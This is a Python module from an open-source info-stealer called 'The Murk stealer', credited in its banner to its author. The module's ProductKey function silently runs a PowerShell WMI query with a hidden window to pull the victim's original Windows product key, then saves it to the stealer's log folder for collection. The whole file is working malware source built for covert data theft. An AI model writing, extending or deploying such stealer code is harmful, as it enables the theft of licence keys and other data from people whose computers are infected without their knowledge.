#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from subprocess import STARTUPINFO,STARTF_USESHOWWINDOW,run
from os import sep,environ
from manager.logger import Log
from preferences.config import config

def ProductKey():
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\System\\productkey.txt'
    try:
        startupinfo = STARTUPINFO()
        startupinfo.dwFlags |= STARTF_USESHOWWINDOW
        result = run(
            ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
            capture_output=True,
            text=True,
            startupinfo=startupinfo
        )
        output = result.stdout.strip()
    except Exception as e:
        Log(f"ProductKey ---> {e}")
        return

    if output:
        with open(pathToLogs, 'w', encoding='UTF-8') as f:
            f.write(output)
